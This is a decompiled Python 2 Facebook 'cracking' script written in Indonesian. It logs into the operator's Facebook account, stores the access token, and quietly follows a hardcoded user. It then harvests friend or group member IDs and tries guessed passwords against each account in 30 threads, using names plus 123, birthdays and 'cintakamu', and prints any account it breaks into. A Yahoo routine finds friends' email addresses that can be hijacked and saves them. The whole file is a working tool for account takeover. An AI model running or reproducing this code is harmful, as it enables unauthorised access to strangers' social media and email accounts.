#Decompiled  by trio
import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
from multiprocessing.pool import ThreadPool

def po():
	os.system('clear')
	
os.system('clear')

def minta():
	os.system('xdg-open https://api.whatsapp.com/send?phone=+6283122674548&text=Hay%20gan%20saya%20minta%20username%20dari%20Script%20FUCK%20pliss%20')
	
def tk():
    titik = [
     'J','JA','JAN','JANG','JANGA','JANGAN','JANGAN ','JANGAN L','JANGAN LU','JANGAN LUP','JANGAN LUPA','JANGAN LUPA ','JANGAN LUPA S','JANGAN LUPA SU','JANGAN LUPA SUB','JANGAN LUPA SUBS','JANGAN LUPA SUBSC','JANGAN LUPA SUBSCR','JANGAN LUPA SUBSCRI','JANGAN LUPA SUBSCRIB','JANGAN LUPA SUBSCRIBE','JANGAN LUPA SUBSCRIBER','JANGAN LUPA SUBSCRIBER ','JANGAN LUPA SUBSCRIBER G','JANGAN LUPA SUBSCRIBER GA','JANGAN LUPA SUBSCRIBER GAN']
     
    for o in titik:
        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92m \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)

def pilih1():
    asu= raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if asu == '':
        print '\x1b[1;91m[!] Di Ketik angkanya kemudian enter !'
        pilih1()
    else:
        if asu == '1':
            minta()
            os.sys.exit()
        else:
            if asu == '2':
                os.system('clear')
                restart()
            else:
                print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + asu + ' \x1b[1;91mTidak ada, pilihannya di baca dulu gan !'
                pilih1()

def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
#kecepatan mengetik
        time.sleep(random.random() * 0.01)

mengetik('\x1b[1;39m       Welcome to\x1b[1;31m N45HT\x1b[1;95m Nusantara\x1b[1;94m 1945\x1b[1;93m Hac\x1b[0m\n                 Decompiled by trio \n')
print
mengetik('\x1b[1;97m\xe2\x95\x94' + 49 * '\xe2\x95\x90')
mengetik('\x1b[1;31m      \xe3\x96\x91Silakan Hubungi +62 831 2267 4548')
mengetik('\x1b[1;31m  Untuk mendapatkan Username & Password gratis')
mengetik('\x1b[1;97m\xe2\x95\x9a' + 49 * '\xe2\x95\x90')

username = 'trio'     

password = ''

def restart():

	ngulang = sys.executable

	os.execl(ngulang, ngulang, *sys.argv)

def main1():
  
	uname = raw_input("username : ")

	if uname == username:

		pwd = raw_input("password : ")
		
		if pwd == password:
			tk()
			print('\x1b[1;34m jancok malah iso login')
			login()
			
		else:

			os.system('clear')
		
		mengetik('\x1b[1;39m\n       Welcome to\x1b[1;31m N45HT\x1b[1;95m Nusantara\x1b[1;94m 1945\x1b[1;93m Hac\x1b[0m\n                 Decompiled by trio \n')
		mengetik('\x1b[1;31m****************************************************\n')
		mengetik('\x1b[1;95m    Maaf gan \x1b[1;92mPassword \x1b[1;95myang kamu ketik  Salah\n')
		mengetik('\x1b[1;97m\xe2\x95\x94' + 49 * '\xe2\x95\x90')
		mengetik ('\x1b[1;37;40m     MINTA \x1b[1;92mPASSWORD\x1b[1;37;40m SECARA GRATIS KEPADA SAYA ?')
		mengetik( '\x1b[1;37;40m             1. Minta')
		mengetik ('\x1b[1;37;40m             2. Tidak, Coba Login lagi')
		mengetik('\x1b[1;31;40m         Mohon di ketik angka 1 atau 2 gan\n                  sesuai keinginan')
		mengetik('\x1b[1;97m\xe2\x95\x9a' + 49 * '\xe2\x95\x90')
		print
		pilih1()

	else:
		
		os.system('clear')
		
		mengetik('\x1b[1;39m\n       Welcome to\x1b[1;31m N45HT\x1b[1;95m Nusantara\x1b[1;94m 1945\x1b[1;93m Hac\x1b[0m\n                 Decompiled by trio \n')
		mengetik('\x1b[1;31m***************************************************\n')
		mengetik('\x1b[1;95m    Maaf gan \x1b[1;92mUsername \x1b[1;95myang kamu ketik  Salah\n')
		mengetik('\x1b[1;97m\xe2\x95\x94' + 49 * '\xe2\x95\x90')
		mengetik ('\x1b[1;37;40m     MINTA \x1b[1;92mUSERNAME\x1b[1;37;40m SECARA GRATIS KEPADA SAYA ?')
		mengetik( '\x1b[1;37;40m             1. Minta')
		mengetik ('\x1b[1;37;40m             2. Tidak, Coba Login lagi')
		mengetik('\x1b[1;31;40m         Mohon di ketik angka 1 atau 2 gan\n                  sesuai keinginan')
		mengetik('\x1b[1;97m\xe2\x95\x9a' + 49 * '\xe2\x95\x90')
		print
		pilih2()
		
def pilih2():
    asu= raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if asu == '':
        print '\x1b[1;91m[!] Di Ketik angkanya kemudian enter !'
        pilih2()
    else:
        if asu == '1':
            minta()
            os.sys.exit()
        else:
            if asu == '2':
                os.system('clear')
                restart()
            else:
                print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + asu + ' \x1b[1;91mTidak ada, pilihannya di baca dulu gan !'
                pilih2()
        
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '\x1b[1;91m[!] Keluar'
    os.sys.exit()

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

logo = '\x1b[1;56m               Decompiled by trio\n[+] github    : https://github.com/triosihn       [+]\n[+] Channel   : trio /  UCYtIaiNL2DhdhYnv2wg0bAw  [+]\n[+] Instagram : @trosihn                          [+]\n[+] WhatsApp  : +62 831 2267 4548                 [+]\n\x1b[1;92m     [!] GUNAKAN DENGAN SANTUY SAMBIL NGOPI[!]\x1b\n\n\x1b[1;31m Harap Masukkan Akun Facebook kalian terlebih dahulu\n              ke google chrome[!]\x1b'
	
def tik():
    titik = [
     'L','LO','LOA','LOAD','LOADI','LOADIN','LOADING','LOADING ','LOADING G','LOADING GA','LOADING GAN']
    for o in titik:
        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mSERVER : \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)

back = 0
threads = []
berhasil = []
cekpoint = []
gagal = []
id = []
em = []
listgrup = []
tidak = '\x1b[31mNot Vuln'
bisa = '\x1b[32mVuln'


def login():
    os.system('clear')
    try:
        toket = open('hacker.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print'\n'
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN AKUN FACEBOOK SLUR \x1b[1;91m[\xe2\x98\x86]'
        id = raw_input('\x1b[1;91m[+] \x1b[1;36mEmail or Telp FB \x1b[1;91m:\x1b[1;92m ')
        pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword FB \x1b[1;91m:\x1b[1;92m ')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;91m[!] Tidak ada koneksi internet gan ?'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                zedd = open('hacker.txt', 'w')
                zedd.write(z['access_token'])
                zedd.close()
                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mMantap slur Login Sukses'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                os.system('xdg-open https://www.youtube.com/channel/UCYtIaiNL2DhdhYnv2wg0bAw')
                time.sleep(2)
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;91m[!] Tidak ada koneksi internet gan ?'
                keluar()

        if 'checkpoint' in url:
        	
            print '\n\n\n\n\x1b[1;91m[!] \x1b[1;95mAkun kena Checkpoint segera login lewat chrome'
            print '\n\x1b[1;91m            [!] \x1b[1;93mCaranya\x1b[1;91m[!]'
            print '\n\x1b[1;91m[!] \x1b[1;93m1. Buka https://m.facebook.com/login.php'
            print '\n\x1b[1;91m[!] \x1b[1;93m2. Login dengan akun yang Checkpoint tadi'
            print '\n\x1b[1;91m[!] \x1b[1;93m3. Ikuti perintahnya'
            print '\n\x1b[1;91m[!] \x1b[1;93m4. Jika belum bisa, tunggu beberapa hari'
            print '\n\x1b[1;91m[!] \x1b[1;93mJika sudah bisa Jangan Berbuat dosa lagi\x1b[1;91m[!]'
            os.system('rm -rf hacker.txt')
            time.sleep(1)
            
            keluar()
        else:
            print '\n\x1b[1;91m[!] Login Gagal'
            os.system('rm -rf hacker.txt')
            time.sleep(1)
            login()


def menu():
    os.system('clear')
    try:
        toket = open('hacker.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf hacker.txt')
        time.sleep(1)
        login()
    else:
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(otw.text)
            nama = a['name']
            id = a['id']
        except KeyError:
            os.system('clear')
            print '\x1b[1;91m[!] \x1b[1;93mSepertinya akun kena Checkpoint hahahaha'
            os.system('rm -rf hacker.txt')
            time.sleep(1)
            login()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[!] Tidak ada koneksi internet gan ?'
            keluar()

    os.system('clear')
    print 60 * '\x1b[1;97m\xe2\x95\x90'
    print logo
    print 60 * '\x1b[1;97m\xe2\x95\x90'
    print('\n')
    print '\x1b[1;97m\xe2\x95\x94' + 49 * '\xe2\x95\x90'
    print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Nama \x1b[1;91m: \x1b[1;92m' + nama
    print '\x1b[1;97m\xe2\x95\x9a' + 49 * '\xe2\x95\x90'
    print '\x1b[1;37;40m1. Crack Password Teman'
    print '\x1b[1;37;40m2. Yahoo Crack'
    print '\x1b[1;37;40m3. Ambil Id Grup '   
    print '\x1b[1;31;40m4. Subscribe my Channel pleace'      
    print '\x1b[1;37;40m0. Keluar       '
    print
    pilih()

def pilih():
    zedd = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if zedd == '':
        print '\x1b[1;91m[!] Di ketik angkanya tolol'
        pilih()
    else:
        if zedd == '1':
            super()
        else:
            if zedd == '2':
                menu_yahoo()
            else:
                if zedd == '3':
                    grupsaya()
                else:
                    if zedd == '4':
                        os.system('xdg-open https://www.youtube.com/channel/UCYtIaiNL2DhdhYnv2wg0bAw')
                        keluar()
                    else:
                        if zedd == '0':
                            os.system('rm -rf hacker.txt')
                            os.system('xdg-open https://www.youtube.com/channel/UCYtIaiNL2DhdhYnv2wg0bAw')
                            keluar()
                        else:
                            print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + zedd + ' \x1b[1;91mTidak ada'
                            pilih()
                                
def super():
    global toket
    os.system('clear')
    try:
        toket = open('hacker.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf hacker.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;92;40m       Pilih Angkanya'
    print '\x1b[1;37;40m1. crack password teman'
    print '\x1b[1;37;40m2. crack password grup'
    print '\x1b[1;31;40m0.keluar'
    print
    pilih_super()

def pilih_super():
    peak = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if peak == '':
        print '\x1b[1;91m[!] ketik angkanya gan'
        pilih_super()
    else:
        if peak == '1':
            os.system('clear')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            jalan('\x1b[1;91m[+] \x1b[1;92mMengambil id teman \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        else:
            if peak == '2':
                os.system('clear')
                print 52 * '\x1b[1;97m\xe2\x95\x90'
                print logo
                print 52 * '\x1b[1;97m\xe2\x95\x90'
                idg = raw_input('\x1b[1;91m[+] \x1b[1;92mID Grup   \x1b[1;91m:\x1b[1;97m ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
                except KeyError:
                    print '\x1b[1;91m[!] Grup tidak ditemukan'
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                    super()

                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                s = json.loads(re.text)
                for i in s['data']:
                    id.append(i['id'])

            else:
                if peak == '0':
                    menu()
                else:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mTidak ada'
                    pilih_super()
    print '\x1b[1;91m[+] \x1b[1;92mJumlah ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)

    print
    print 40 * '\x1b[1;97m\xe2\x95\x90'

    def main(arg):
        user = arg
        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m[\x1b[1;92m:)\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass1
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93m:(\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass1
                else:
                    pass2 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;97m[\x1b[1;92m:)\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass2
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[\x1b[1;93m:(\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass2
                        else:
                            pass3 = b['last_name'] + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;97m[\x1b[1;92m:)\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass3
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;97m[\x1b[1;93m:(\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass3
                                else:
                                    lahir = b['birthday']
                                    pass4 = lahir.replace('/', '')
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;97m[\x1b[1;92m:)\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass4
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;97m[\x1b[1;93m:(\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass4
                                        else:
                                           pass5 = 'cintakamu'
                                           data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                           q = json.load(data)
                                           if 'access_token' in q:
                                               print '\x1b[1;97m[\x1b[1;92m:)\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass5
                                           else:
                                              if 'www.facebook.com' in q['error_msg']:
                                                  print '\x1b[1;97m[\x1b[1;93m:(\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass5
                                     
                                 
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    super()

def menu_yahoo():
    os.system('clear')
    try:
        toket = open('hacker.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf hacker.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    mpsh = []
    jml = 0
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
    teman = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    save = open('MailVuln.txt', 'w')
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x1b[1;92m' + tidak + '\x1b[1;97m]'
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print 40 * '\x1b[1;97m\xe2\x95\x90'
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + nama
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + id
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;97m ' + mail + ' [\x1b[1;92m' + bisa + '\x1b[1;97m]'
                    print 40 * '\x1b[1;97m\xe2\x95\x90'
                else:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x1b[1;92m' + tidak + '\x1b[1;97m]'
        except KeyError:
            pass

    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m:\x1b[1;97m Yahoo_Crack.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    menu()

def grupsaya():
    os.system('clear')
    try:
        toket = open('hacker.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf hacker.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print('\n')
        print 49 * '\x1b[1;97m\xe2\x95\x90'
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
        print 49 * '\x1b[1;97m\xe2\x95\x90'
        try:
            uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
            gud = json.loads(uh.text)
            for p in gud['data']:
                nama = p['name']
                id = p['id']
                f = open('grupid.txt', 'w')
                listgrup.append(id)
                f.write(id + '\n')
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + str(nama)
                print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + str(id)
                print 40 * '\x1b[1;97m='

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah Grup \x1b[1;96m%s' % len(listgrup)
            print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m: \x1b[1;97mgrupid.txt'
            f.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()
        except KeyError:
            os.remove('grupid.txt')
            print '\x1b[1;91m[!] Grup tidak ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
            keluar()         
        
if __name__ == '__main__':
	main1()
	login()

	os.system('clear')

	restart()
